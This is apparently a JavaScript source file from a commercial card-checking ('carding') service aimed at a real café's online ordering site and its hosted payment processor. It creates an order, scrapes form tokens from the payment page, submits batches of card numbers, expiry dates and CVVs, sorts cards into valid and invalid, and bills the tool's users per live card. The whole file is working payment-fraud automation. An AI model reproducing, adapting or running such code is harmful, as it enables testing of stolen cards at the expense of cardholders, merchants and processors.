"use strict";
const Axios = require("axios");
const Redis = use("Redis");
const Menssagem = require("./MenssagemwebsocketController");

const Database = use("Database");
const User = use("App/Models/User");
class AmarithcafeController {
  static async getcode(id, token) {
    let data =
      '{"skin":"weborder","establishmentId":1,"items":[{"modifieritems":[],"price":1.5,"product":209,"product_name_override":"z","quantity":1,"product_sub_id":"c1160"}],"orderInfo":{"created_date":"2020-03-30T15:45:00","pickup_time":"2020-03-31T15:45:00","dining_option":0,"customer":{"phone":"1","email":"b@o.com","first_name":"B","last_name":"L"},"call_name":""},"paymentInfo":{"tip":0,"type":2},"recaptcha_v2_token":"' +
      token +
      '"}';
    await Axios.post(
      `https://amarithcafe.revelup.com/weborders/create_order_and_pay_v1/`,
      data,
      {
        headers: {
          Host: "amarithcafe.revelup.com",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
          Accept: "application/json",
          Referer: "https://amarithcafe.revelup.com/weborder/?establishment=1",
          "Content-Type": "application/x-www-form-urlencoded",
          Connection: "keep - alive"
        }
      }
    )
      .then(response => {
        let keys = Object.keys(response.data);
        for (const key of keys) {
          if (key == "errorMsg") {
            Redis.set(id + "restart", "true");
            //console.log("erro: " + response.data[key]);
            //////////////q
            //this.cardValidation(id, username);
            // this.getFilds(id, username, 'code')
          }
          if (key == "data") {
            let code = response.data.data.query.TransactionSetupID;
            // console.log("code: " + code);
            this.getFilds(id, code);
          }
        }
      })
      .catch(err => {
        Redis.set(id + "restart", err.message);
      });
  }
  static async getFilds(id, code) {
    // const cards = await CadastroCards.where({ tested: false, owner: username, userID: id }).limit(5);
    await Axios.post(
      `https://transaction.hostedpayments.com/?TransactionSetupID=${code}`,
      {
        headers: {
          Host: "transaction.hostedpayments.com",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0",
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          Connection: "keep-alive",
          "Upgrade-Insecure-Requests": "1"
        },

        USERAGENT:
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
      }
    )
      .then(async response => {
        let GETVIEWSTATE = response.data.indexOf(
          'name="__VIEWSTATE" id="__VIEWSTATE" value="'
        ); //47
        let GETVIEWSTATEGENERATOR = response.data.indexOf(
          'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="'
        ); //64
        let GETEVENTVALIDATION = response.data.indexOf(
          'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="'
        ); //59

        let FinalVIEWSTATE = response.data.indexOf('"', GETVIEWSTATE + 44);
        let FinalVIEWSTATEGENERATOR = response.data.indexOf(
          '"',
          GETVIEWSTATEGENERATOR + 62
        );
        let FinalEVENTVALIDATION = response.data.indexOf(
          '"',
          GETEVENTVALIDATION + 56
        );

        let STATE = encodeURIComponent(
          response.data.substr(
            GETVIEWSTATE + 43,
            FinalVIEWSTATE - (GETVIEWSTATE + 43)
          )
        );
        let STATEGENERATOR = encodeURIComponent(
          response.data.substr(
            GETVIEWSTATEGENERATOR + 61,
            FinalVIEWSTATEGENERATOR - (GETVIEWSTATEGENERATOR + 61)
          )
        );
        let EVENTVALIDATION = encodeURIComponent(
          response.data.substr(
            GETEVENTVALIDATION + 55,
            FinalEVENTVALIDATION - (GETEVENTVALIDATION + 55)
          )
        );
        this.validar(id, code, STATE, STATEGENERATOR, EVENTVALIDATION);
      })
      .catch(err => {
        Redis.set(id + "restart", err.message);
      });
  }
  static async validar(id, code, STATE, STATEGENERATOR, EVENTVALIDATION) {
    let cont;
    let salvarcards = [];
    Redis.smembers(id + "listcards", async (err, cards) => {
      if (cards != '') {
        cards.length > 5 ? (cont = 5) : (cont = cards.length);

        for (let i = 0; i < cont; i++) {
          let cardSeparetion = cards[i].split("|");
          let cardAno = cardSeparetion[2].substr(-2);
          //let data = `scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=${STATE}__VIEWSTATEGENERATOR=${STATEGENERATOR}&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=${EVENTVALIDATION}&hdnCancelled=&cardNumber=${cardSeparetion[0]}&ddlExpirationMonth=${cardSeparetion[1]}&ddlExpirationYear=${cardAno}&CVV=${cardSeparetion[3]}&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__ASYNCPOST=true&`;
          let data = `scriptManager=upFormHP%7CprocessTransactionButton&hdnCancelled=&cardNumber=${cardSeparetion[0]}&ddlExpirationMonth=${cardSeparetion[1]}&ddlExpirationYear=${cardAno}&CVV=${cardSeparetion[3]}&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=${STATE}&__VIEWSTATEGENERATOR=${STATEGENERATOR}&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=${EVENTVALIDATION}&__ASYNCPOST=true&`;
          await Axios.post(
            `https://transaction.hostedpayments.com/?TransactionSetupID=${code}`,
            data,
            {
              headers: {
                Host: "transaction.hostedpayments.com",
                "User-Agent":
                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0",
                Accept: "*/*",
                "X-Requested-With": "XMLHttpRequest",
                "X-MicrosoftAjax": "Delta=true",
                "Content-Type":
                  "application/x-www-form-urlencoded; charset=utf-8",
                Connection: "keep-alive",
                Referer: `https://transaction.hostedpayments.com/?TransactionSetupID=${code}`
              },
              USERAGENT:
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
            }
          )
            .then(async response => {
              let GETR = response.data.indexOf("<b>Error</b>:");
              let ENDR = response.data.indexOf("</span>", GETR + 12);
              let result = response.data.substr(GETR + 13, ENDR - (GETR + 13));
              console.log(result);
              switch (result.trim()) {
                case "Call Issuer":
                  let sald;
                  const credd = await User.find(id);
                  let cr = credd.balance.split(" ");
                  let h = credd.balance.indexOf("h");
                  if (h == -1) {
                    let saldo = parseInt(cr[0]) - 1;
                    sald =
                      saldo +
                      " " +
                      cr[1] +
                      " " +
                      cr[2] +
                      " " +
                      cr[3] +
                      " " +
                      cr[4] +
                      " " +
                      cr[5];

                    await Database.table("users")
                      .where("id", id)
                      .update({ balance: sald });
                  }

                  salvarcards.push({
                    id: id,
                    valid: true,
                    card: cards[i]
                  });
                  Redis.srem(id + "listcards", 0, cards[i]);
                  //lançar menansagem
                  Menssagem.interacao04(id, 1, cards[i], sald);

                  break;
                case "TransactionSetupID expired":
                  break;

                default:
                  salvarcards.push({
                    id: id,
                    valid: false,
                    card: cards[i]
                  });
                  Redis.srem(id + "listcards", 0, cards[i]);
                  Menssagem.interacao05(id, 1, cards[i]);
                  break;
              }
            })
            .catch(err => {
              Redis.set(id + "restart", err.message);
            });
          setTimeout(async () => {
            Redis.smembers(id + "listcards", async (err, list) => {
              if (list == null) {
                Menssagem.stop(id);

                Redis.keys("*", (err, re) => {
                  for (let index = 0; index < re.length; index++) {
                    let d = re.indexOf(id);
                    if (d != -1) {
                      Redis.del(re[index]);
                      if (re != null) {
                      }
                    }
                  }
                });
              }
            });
          }, 100);
        } //if
        Menssagem.interacao03(id)
        Redis.set(id + "restart", 'ok');
        await Axios.post(`http://pont-mongodb:3332/savecards`, salvarcards, {
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
            Accept: "application/json"
          }
        }).then(response => {});
      } //for
    }); //redis
  }
}

module.exports = AmarithcafeController;
